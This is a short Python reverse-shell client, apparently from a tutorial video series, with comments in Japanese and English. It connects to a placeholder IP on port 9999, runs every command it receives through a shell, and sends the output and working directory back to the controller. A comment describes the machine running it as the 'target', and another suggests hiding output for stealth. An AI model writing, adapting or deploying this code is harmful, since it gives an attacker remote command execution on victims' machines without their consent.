#author: Johnjimy Som
#date: 2018年8月24日
#version: 2.0.0
#description: このスクリプトは自分で保管してください。
#このスクリプトはサーバーに接続し、指示を待ちます。

import os #access the operating systems
import socket #connect to server
import subprocess #allows to control target machine's operating systems

s = socket.socket()#コンピュータは他のコンピュータに接続できます。
host = '###.#.#.#'#<-- ターゲットサーバのIPを入れてください
port = 9999
s.connect((host,port))#bind the network

#video 4
while True:
    data = s.recv(1024)#1024 buffer size
    if data[:2].decode("utf-8") == 'cd': #convert byte to string
        os.chdir(data[3:].decode("utf-8"))#os = access operating systrm
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#open the subpros, open a cmd from a terminal, shell shouldnt be added..
        #takes any output puts out to standard string
    output_bytes=cmd.stdout.read()+cmd.stderr.read()
        #output_bytes = cmd.stdout.read()+cmd.strderr.read()
    output_str = str(output_bytes, "utf-8")
    s.send(str.encode(output_str + str(os.getcwd())  + ">"))#get current directory
    print(output_str)#if ur hidoi hito dont print

#   close connection
s.close()